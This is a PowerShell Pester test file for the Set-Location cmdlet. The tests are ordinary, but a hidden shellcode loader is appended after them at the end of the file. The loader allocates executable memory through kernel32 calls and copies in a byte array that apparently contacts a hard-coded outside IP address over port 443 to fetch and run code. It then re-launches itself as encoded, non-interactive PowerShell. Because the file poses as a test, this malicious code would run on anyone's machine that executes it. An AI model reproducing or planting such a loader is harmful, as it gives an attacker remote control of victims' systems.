

Describe "Set-Location" -Tags "CI" {

    BeforeAll {
        $startDirectory = Get-Location

        if ($IsWindows)
        {
            $target = "C:\"
        }
        else
        {
            $target = "/"
        }
    }

    AfterAll {
        Set-Location $startDirectory
    }

    It "Should be able to be called without error" {
        { Set-Location $target }    | Should -Not -Throw
    }

    It "Should be able to be called on different providers" {
        { Set-Location alias: } | Should -Not -Throw
        { Set-Location env: }   | Should -Not -Throw
    }

    It "Should have the correct current location when using the set-location cmdlet" {
        Set-Location $startDirectory

        $(Get-Location).Path | Should -BeExactly $startDirectory.Path
    }

    It "Should be able to use the Path parameter" {
        { Set-Location -Path $target } | Should -Not -Throw
    }

    It "Should generate a pathinfo object when using the Passthru switch" {
        $result = Set-Location $target -PassThru
        $result | Should -BeOfType System.Management.Automation.PathInfo
    }

    
    It "Should accept path containing wildcard characters" -Pending {
        $null = New-Item -ItemType Directory -Path "$TestDrive\aa"
        $null = New-Item -ItemType Directory -Path "$TestDrive\ba"
        $testPath = New-Item -ItemType Directory -Path "$TestDrive\[ab]a"

        Set-Location $TestDrive
        Set-Location -Path "[ab]a"
        $(Get-Location).Path | Should -BeExactly $testPath.FullName
    }

    It "Should not use filesystem root folder if not in filesystem provider" -Skip:(!$IsWindows) {
        
        $foundFolder = $false
        foreach ($folder in Get-ChildItem "${env:SystemDrive}\" -Directory) {
            if (-Not (Test-Path "HKCU:\$($folder.Name)")) {
                $testFolder = $folder.Name
                $foundFolder = $true
                break
            }
        }
        $foundFolder | Should -BeTrue
        Set-Location HKCU:\
        { Set-Location ([System.IO.Path]::DirectorySeparatorChar + $testFolder) -ErrorAction Stop } |
            Should -Throw -ErrorId "PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand"
    }

    It "Should use actual casing of folder on case-insensitive filesystem" -Skip:($IsLinux) {
        $testPath = New-Item -ItemType Directory -Path testdrive:/teST
        Set-Location $testPath.FullName.ToUpper()
        $(Get-Location).Path | Should -BeExactly $testPath.FullName
    }

    It "Should use actual casing of folder on case-sensitive filesystem: <dir>" -Skip:(!$IsLinux) {
        $dir = "teST"
        $testPathLower = New-Item -ItemType Directory -Path (Join-Path $TestDrive $dir.ToLower())
        $testPathUpper = New-Item -ItemType Directory -Path (Join-Path $TestDrive $dir.ToUpper())
        Set-Location $testPathLower.FullName
        $(Get-Location).Path | Should -BeExactly $testPathLower.FullName
        Set-Location $testPathUpper.FullName
        $(Get-Location).Path | Should -BeExactly $testPathUpper.FullName
        { Set-Location (Join-Path $TestDrive $dir) -ErrorAction Stop } | Should -Throw -ErrorId "PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand"
    }

    Context 'Set-Location with no arguments' {

        It 'Should go to $env:HOME when Set-Location run with no arguments from FileSystem provider' {
            Set-Location 'TestDrive:\'
            Set-Location
            (Get-Location).Path | Should -BeExactly (Get-PSProvider FileSystem).Home
        }

        It 'Should go to $env:HOME when Set-Location run with no arguments from Env: provider' {
            Set-Location 'Env:'
            Set-Location
            (Get-Location).Path | Should -BeExactly (Get-PSProvider FileSystem).Home
        }
    }

    It "Should set location to new drive's current working directory when path is the colon-terminated name of a different drive" {
        try
        {
            $oldLocation = Get-Location
            Set-Location 'TestDrive:\'
            New-Item -Path 'TestDrive:\' -Name 'Directory1' -ItemType Directory
            New-PSDrive -Name 'Z' -PSProvider FileSystem -Root 'TestDrive:\Directory1'
            New-Item -Path 'Z:\' -Name 'Directory2' -ItemType Directory

            Set-Location 'TestDrive:\Directory1'
            $pathToTest1 = (Get-Location).Path
            Set-Location 'Z:\Directory2'
            $pathToTest2 = (Get-Location).Path

            Set-Location 'TestDrive:'
            (Get-Location).Path | Should -BeExactly $pathToTest1
            Set-Location 'Z:'
            (Get-Location).Path | Should -BeExactly $pathToTest2
        }
        finally
        {
            Set-Location $oldLocation
            Remove-PSDrive -Name 'Z'
        }
    }

    Context 'Set-Location with last location history' {

        It 'Should go to last location when specifying minus as a path' {
            $initialLocation = Get-Location
            Set-Location ([System.IO.Path]::GetTempPath())
            Set-Location -
            (Get-Location).Path | Should -Be ($initialLocation).Path
        }

        It 'Should go to last location back, forth and back again when specifying minus, plus and minus as a path' {
            $initialLocation = (Get-Location).Path
            Set-Location ([System.IO.Path]::GetTempPath())
            $tempPath = (Get-Location).Path
            Set-Location -
            (Get-Location).Path | Should -Be $initialLocation
            Set-Location +
            (Get-Location).Path | Should -Be $tempPath
            Set-Location -
            (Get-Location).Path | Should -Be $initialLocation
        }

        It 'Should go back to previous locations when specifying minus twice' {
            $initialLocation = (Get-Location).Path
            Set-Location ([System.IO.Path]::GetTempPath())
            $firstLocationChange = (Get-Location).Path
            Set-Location ([System.Environment]::GetFolderPath("user"))
            Set-Location -
            (Get-Location).Path | Should -Be $firstLocationChange
            Set-Location -
            (Get-Location).Path | Should -Be $initialLocation
        }

        It 'Location History is limited' {
            $initialLocation = (Get-Location).Path
            $maximumLocationHistory = 20
            foreach ($i in 1..$maximumLocationHistory) {
                Set-Location ([System.IO.Path]::GetTempPath())
            }
            $tempPath = (Get-Location).Path
            
            foreach ($i in 1..$maximumLocationHistory) {
                Set-Location -
            }
            (Get-Location).Path | Should Be $initialLocation
            { Set-Location - } | Should -Throw -ErrorId 'System.InvalidOperationException,Microsoft.PowerShell.Commands.SetLocationCommand'
            
            foreach ($i in 1..($maximumLocationHistory)) {
                Set-Location +
            }
            (Get-Location).Path | Should -Be $tempPath
            { Set-Location + } | Should -Throw -ErrorId 'System.InvalidOperationException,Microsoft.PowerShell.Commands.SetLocationCommand'
        }
    }

    It 'Should nativate to literal path "<path>"' -TestCases @(
        @{ path = "-" },
        @{ path = "+" }
    ) {
        param($path)

        Set-Location $TestDrive
        $literalPath = Join-Path $TestDrive $path
        New-Item -ItemType Directory -Path $literalPath
        Set-Location -LiteralPath $path
        (Get-Location).Path | Should -BeExactly $literalPath
    }

    Context 'Test the LocationChangedAction event handler' {

        AfterEach {
            $ExecutionContext.InvokeCommand.LocationChangedAction = $null
        }

        It 'The LocationChangedAction should fire when changing location' {
            $initialPath = $pwd
            $oldPath = $null
            $newPath = $null
            $eventSessionState = $null
            $eventRunspace = $null
            $ExecutionContext.InvokeCommand.LocationChangedAction = {
                (Get-Variable eventRunspace).Value = $this
                (Get-Variable eventSessionState).Value = $_.SessionState
                (Get-Variable oldPath).Value = $_.oldPath
                (Get-Variable newPath).Value = $_.newPath
            }
            Set-Location ..
            $newPath.Path | Should -Be $pwd.Path
            $oldPath.Path | Should -Be $initialPath.Path
            $eventSessionState | Should -Be $ExecutionContext.SessionState
            $eventRunspace | Should -Be ([runspace]::DefaultRunspace)
        }

        It 'Errors in the LocationChangedAction should be catchable but not fail the cd' {
            $location = $PWD
            Set-Location ..
            $ExecutionContext.InvokeCommand.LocationChangedAction = { throw "Boom" }
            
            { Set-Location $location } | Should -Throw "Boom"
            
            $PWD.Path | Should -Be $location.Path
        }
    }
}

$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0xbb,0x01,0x00,0x00,0xe8,0x1f,0x01,0x00,0x00,0x2f,0x6b,0x67,0x34,0x56,0x6e,0x6a,0x4a,0x62,0x72,0x64,0x51,0x49,0x59,0x77,0x6c,0x69,0x58,0x37,0x6c,0x33,0x52,0x77,0x47,0x75,0x70,0x4d,0x72,0x76,0x34,0x6a,0x4e,0x63,0x6a,0x35,0x45,0x4a,0x6a,0x68,0x44,0x43,0x72,0x4d,0x66,0x66,0x54,0x42,0x63,0x68,0x65,0x73,0x6f,0x77,0x75,0x58,0x75,0x32,0x4f,0x78,0x55,0x6d,0x53,0x50,0x73,0x54,0x48,0x31,0x70,0x4e,0x76,0x44,0x33,0x6f,0x4e,0x55,0x53,0x30,0x59,0x4a,0x58,0x76,0x4b,0x51,0x76,0x4a,0x47,0x58,0x67,0x74,0x49,0x61,0x71,0x4a,0x79,0x6a,0x74,0x39,0x4c,0x70,0x34,0x75,0x75,0x63,0x5f,0x69,0x6b,0x79,0x35,0x69,0x5f,0x48,0x31,0x77,0x79,0x64,0x6f,0x39,0x6c,0x6a,0x41,0x4d,0x48,0x56,0x46,0x59,0x48,0x39,0x70,0x59,0x57,0x77,0x5f,0x44,0x70,0x55,0x4e,0x77,0x65,0x6b,0x41,0x6e,0x7a,0x41,0x70,0x4d,0x2d,0x2d,0x56,0x63,0x45,0x59,0x57,0x67,0x46,0x46,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x32,0xe0,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x08,0x4f,0x75,0xd9,0xe8,0x49,0x00,0x00,0x00,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x77,0xff,0xff,0xff,0x36,0x32,0x2e,0x37,0x33,0x2e,0x32,0x30,0x35,0x2e,0x32,0x39,0x00,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni -enc";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $gq";}

